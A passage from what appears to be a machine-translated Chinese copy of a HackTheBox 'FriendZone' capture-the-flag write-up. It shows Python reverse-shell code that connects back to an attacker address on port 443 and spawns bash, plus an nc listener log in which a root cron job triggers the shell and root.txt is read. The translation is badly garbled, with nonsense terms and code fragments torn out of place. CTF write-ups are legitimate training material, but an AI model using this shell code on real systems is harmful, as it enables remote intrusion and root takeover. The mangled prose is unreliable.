    s.connect(("10.10.14.7",443))
    dup2(s.fileno(),0)
    dup2(s.fileno(),1)
    dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
    s.close()
    

这是一个标准的蟒蛇反向外壳，除了，我只是写.那是因为我现在在os模块中。如果你只是，它实际上应该仍然有效，但我删除了它，因为它不需要。`os.dup2()``dup2()``import os`

我会保存下来的。由于等待两分钟失败很烦人，我会自己打开Python，看看我是否能以朋友的身份找回一个外壳。在刚开始时，我得到一个回调，并有一个外壳。我会退出并等待克罗因。一旦两分钟过去，壳：`python`

    root@kali# nc -lnvp 443
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.123.
    Ncat: Connection from 10.10.10.123:46118.
    root@FriendZone:~# id
    uid=0(root) gid=0(root) groups=0(root)
    

从那里，抓住：`root.txt`

    root@FriendZone:~# cat root.txt 
    b0e6c60b...
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html#box-info)